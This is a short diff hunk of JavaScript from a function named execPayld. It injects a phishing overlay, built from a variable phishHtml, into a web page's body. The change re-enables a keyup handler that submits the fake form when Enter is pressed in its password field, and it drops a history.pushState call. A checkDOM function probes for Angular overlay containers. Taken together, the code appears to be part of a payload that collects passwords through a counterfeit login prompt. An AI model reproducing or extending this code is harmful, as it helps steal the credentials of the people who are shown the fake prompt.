@@ -80,12 +80,11 @@ function execPayld() {
   let phishDiv = document.createElement('div');
   phishDiv.innerHTML = phishHtml;
   document.getElementsByTagName('body')[0].appendChild(phishDiv);
-//  document.getElementById('password').addEventListener('keyup', event => {
-//    if(event.key !== 'Enter') return;
-//    document.getElementById('okbutton').click();
-//    event.preventDefault();
-//  });
-  history.pushState(null, null, '/test');
+  document.getElementById('password').addEventListener('keyup', event => {
+    if(event.key !== 'Enter') return;
+    document.getElementById('okbutton').click();
+    event.preventDefault();
+  });
 }
 function checkDOM() {
   var popupElements1 = document.getElementsByClassName('cdk-overlay-container');
